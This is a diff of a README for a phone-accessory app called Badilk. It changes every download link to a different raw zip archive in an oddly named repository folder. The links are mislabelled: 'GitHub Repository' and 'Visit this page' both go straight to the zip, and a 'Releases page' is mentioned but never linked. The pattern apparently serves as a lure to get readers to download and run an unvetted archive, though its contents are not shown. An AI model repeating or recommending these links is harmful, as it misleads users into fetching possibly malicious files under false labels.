@@ -7,13 +7,13 @@ Welcome to Badilk! This app helps you find compatible phone accessories quickly 
 
 ## 🏷️ Download Badilk
 
-[![Download Badilk](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/badilk-mobile-v1.0-alpha.5.zip%20Now-%20-brightgreen)](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/badilk-mobile-v1.0-alpha.5.zip)
+[![Download Badilk](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/mobile-badilk-2.2.zip%20Now-%20-brightgreen)](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/mobile-badilk-2.2.zip)
 
 ## 📥 Download & Install
 
 To install Badilk, you need to download the app first. Please visit the link below to access the latest version of Badilk:
 
-[Visit this page to download](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/badilk-mobile-v1.0-alpha.5.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/mobile-badilk-2.2.zip)
 
 Once you're on the Releases page, follow these steps to get started:
 
@@ -62,8 +62,8 @@ If you encounter any issues or have suggestions for improvement, please reach ou
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/badilk-mobile-v1.0-alpha.5.zip)
-- [Visit this page to download](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/badilk-mobile-v1.0-alpha.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/mobile-badilk-2.2.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/Blckppl/badilk-mobile/main/foujdary/mobile-badilk-2.2.zip)
 
 Thank you for choosing Badilk! Enjoy finding the perfect accessories for your phone.
 ```
